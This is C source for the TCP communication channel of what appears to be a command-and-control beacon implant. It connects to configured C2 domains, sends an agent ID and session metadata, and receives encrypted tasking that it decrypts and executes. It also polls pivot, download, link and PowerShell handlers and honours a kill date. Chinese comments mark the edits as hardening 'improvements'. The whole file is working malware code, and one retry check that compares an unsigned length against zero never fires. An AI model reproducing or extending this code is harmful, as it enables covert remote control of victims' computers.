/* 
 * Manage the TCP channel
 */
#include "beacon.h"
#include "channel.h"
#include "commands.h"
#include "security.h"
#include "link.h"

// 改进：添加更多常量定义
#define MAX_GET (1024 * 1024)
#define MIN_FRAME_SIZE 1
#define MAX_RETRIES 3
#define RECV_TIMEOUT 30000  // 30秒超时

static SOCKET server           = INVALID_SOCKET;  // 改进：使用INVALID_SOCKET而不是INVALID_HANDLE_VALUE
static char * tcp_write_buffer = NULL;
static int    tcp_write_len    = 0;
static char * tcp_read_buffer  = NULL;

extern unsigned int post_type;
extern unsigned int agentid;
extern sessdata bigsession;
extern unsigned int sleep_time;

SOCKET wsconnect(char * targetip, int port);
void tcp_flush();

/* send a frame via a socket */
void send_frame(SOCKET my_socket, char * buffer, int length) {
    int bytes_sent = 0;
    int total_sent = 0;
    int frame_length = length;
    
    // 改进：添加输入验证
    if (my_socket == INVALID_SOCKET || buffer == NULL || length <= 0) {
        return;
    }
    
    // 改进：确保完整发送长度字段
    while (total_sent < sizeof(int)) {
        bytes_sent = send(my_socket, ((char *)&frame_length) + total_sent, sizeof(int) - total_sent, 0);
        if (bytes_sent == SOCKET_ERROR) {
            return;
        }
        total_sent += bytes_sent;
    }
    
    // 改进：确保完整发送数据
    total_sent = 0;
    while (total_sent < length) {
        bytes_sent = send(my_socket, buffer + total_sent, length - total_sent, 0);
        if (bytes_sent == SOCKET_ERROR) {
            return;
        }
        total_sent += bytes_sent;
    }
}

/* receive a frame from a socket */
DWORD recv_frame(SOCKET my_socket, char * buffer, DWORD max) {
    DWORD size = 0, total = 0, bytes_received = 0;

    // 改进：添加输入验证
    if (my_socket == INVALID_SOCKET || buffer == NULL || max == 0) {
        return 0;
    }

    /* read the 4-byte length */
    total = 0;
    while (total < sizeof(DWORD)) {
        bytes_received = recv(my_socket, ((char *)&size) + total, sizeof(DWORD) - total, 0);
        if (bytes_received == SOCKET_ERROR || bytes_received == 0) {
            return 0;
        }
        total += bytes_received;
    }

    // 改进：验证帧大小
    if (size == 0 || size > max) {
        return 0;
    }

    /* read in the result */
    total = 0;
    while (total < size) {
        bytes_received = recv(my_socket, buffer + total, size - total, 0);
        if (bytes_received == SOCKET_ERROR || bytes_received == 0) {
            return 0;
        }
        total += bytes_received;
    }
    return size;
}

/* init our connection */
BOOL tcp_init() {
    // 改进：初始化变量
    server = INVALID_SOCKET;
    tcp_write_len = 0;

    /* alloc our data */
    tcp_write_buffer = (char *)malloc(MAX_GET);
    if (tcp_write_buffer == NULL) {
        return FALSE;
    }
    
    // 改进：初始化缓冲区
    memset(tcp_write_buffer, 0, MAX_GET);

    /* set post type to POST_TCP now... since everything seems OK */
    post_type = POST_TCP;

    /* init our winsock socket */
    if (!channel_winsock_init()) {
        free(tcp_write_buffer);
        tcp_write_buffer = NULL;
        return FALSE;
    }

    /* connect! */
    server = wsconnect(setting_ptr(SETTING_DOMAINS), setting_short(SETTING_PORT));
    if (server == INVALID_SOCKET) {
        free(tcp_write_buffer);
        tcp_write_buffer = NULL;
        return FALSE;
    }

    // 改进：设置套接字超时
    DWORD timeout = RECV_TIMEOUT;
    setsockopt(server, SOL_SOCKET, SO_RCVTIMEO, (char*)&timeout, sizeof(timeout));
    setsockopt(server, SOL_SOCKET, SO_SNDTIMEO, (char*)&timeout, sizeof(timeout));

    /* send metadata + agent ID, please */
    if (bigsession.length + sizeof(unsigned int) <= MAX_GET) {
        memcpy(tcp_write_buffer, &agentid, sizeof(unsigned int));
        memcpy(tcp_write_buffer + sizeof(unsigned int), bigsession.data, bigsession.length);
        send_frame(server, tcp_write_buffer, bigsession.length + sizeof(unsigned int));
    }
    
    return TRUE;
}

/*
 *  kill our TCP connection
 */
void tcp_stop() {
    /* do the right thing for our TCP socket */
    if (server != INVALID_SOCKET) {
        closesocket(server);
        server = INVALID_SOCKET;
    }

    /* free up some of our data */
    tcp_write_len = 0;

    /* free our datarz */
    if (tcp_write_buffer != NULL) {
        // 改进：清零内存后释放
        memset(tcp_write_buffer, 0, MAX_GET);
        free(tcp_write_buffer);
        tcp_write_buffer = NULL;
    }

    if (tcp_read_buffer != NULL) {
        // 改进：清零内存后释放
        memset(tcp_read_buffer, 0, MAX_GET);
        free(tcp_read_buffer);
        tcp_read_buffer = NULL;
    }
}

/*
 * write data to our TCP connection
 */
void tcp_write(char * buffer, int len) {
    unsigned int flen = 0;
    int length = 0;
    int mustread = 0;

    // 改进：添加输入验证
    if (buffer == NULL || len <= 0) {
        return;
    }

    // 改进：检查连接状态
    if (server == INVALID_SOCKET) {
        return;
    }

    /* sanity check to make sure we're not sending an obscenely sized file */
    if ((len + sizeof(unsigned int)) > MAX_GET) {
        /* this message is too big, no way in hell! */
        return;
    }
    /* if we're be too big, go ahead and make a post now */
    else if ((tcp_write_len + len + sizeof(unsigned int)) > MAX_GET) {
        /* we're too big... sooo.... let's flush */
        tcp_flush();
        /* we f'd up read/write loop, so let's flag that we need to do a read */
        mustread = 1;
    }

    // 改进：确保写缓冲区有效
    if (tcp_write_buffer == NULL) {
        return;
    }

    /* if we're not too big, let's append our length and data */
    flen = htonl(len);
    memcpy((void *)(tcp_write_buffer + tcp_write_len), (void *)&flen, sizeof(unsigned int));
    tcp_write_len += sizeof(unsigned int);

    /* now, let's append our data to post */
    memcpy((void *)(tcp_write_buffer + tcp_write_len), buffer, len);
    tcp_write_len += len;

    /* TCP loop assumes READ, WRITE, READ, etc. - we do a read here to put loop back on track */
    if (mustread == 1) {
        // 改进：确保读缓冲区已分配
        if (tcp_read_buffer == NULL) {
            tcp_read_buffer = (char *)malloc(MAX_GET);
            if (tcp_read_buffer == NULL) {
                return;
            }
        }

        /* read from the connection */
        length = recv_frame(server, tcp_read_buffer, MAX_GET);
        if (length > 1) {
            length = security_decrypt(tcp_read_buffer, length);
            if (length > 0) {
                process_payload(tcp_read_buffer, length);
            }
        }
    }
}

/* 
 * post our data back
 */
void tcp_flush() {
    // 改进：检查连接和缓冲区状态
    if (server == INVALID_SOCKET || tcp_write_buffer == NULL) {
        return;
    }

    if (tcp_write_len > 0) {
        send_frame(server, (void *)tcp_write_buffer, tcp_write_len);
    }
    else {
        // 改进：发送心跳包
        char heartbeat = 0;
        send_frame(server, (void *)&heartbeat, MIN_FRAME_SIZE);
    }

    tcp_write_len = 0;
}

void tcp_process() {
    int length = 0;
    int error_count = 0;

    // 改进：确保读缓冲区已分配
    if (tcp_read_buffer == NULL) {
        tcp_read_buffer = (char *)malloc(MAX_GET);
        if (tcp_read_buffer == NULL) {
            return;
        }
        memset(tcp_read_buffer, 0, MAX_GET);
    }

    while (TRUE) {
        /* read from the connection */
        length = recv_frame(server, tcp_read_buffer, MAX_GET);
        if (length < 0) {
            error_count++;
            if (error_count >= MAX_RETRIES) {
                return;
            }
            continue;
        }

        // 改进：重置错误计数
        error_count = 0;

        if (length > 1) {
            length = security_decrypt(tcp_read_buffer, length);
            if (length > 0) {
                process_payload(tcp_read_buffer, length);
            }
        }

        // 改进：检查连接状态
        if (server == INVALID_SOCKET) {
            break;
        }

        pivot_poll(command_shell_callback);
        download_poll(command_shell_callback, MAX_PACKET / 2);
        link_poll(command_shell_callback);
        psh_poll(command_shell_callback, MAX_PACKET);

        /* check the kill date */
        if (check_kill_date())
            command_die(command_shell_callback);

        tcp_flush();

        if (sleep_time == 0)
            return;
    }
}

/*
 * put this beacon into a mode where it's waiting for TCP connections
 */
void command_tcp_start() {
    /* setup our TCP connection */
    if (!tcp_init()) {
        return;
    }

    /* process data */
    tcp_process();

    /* OK, time to shut it down */
    tcp_stop();

    /* just kill the process... it's this or crash */
    safe_exit();
}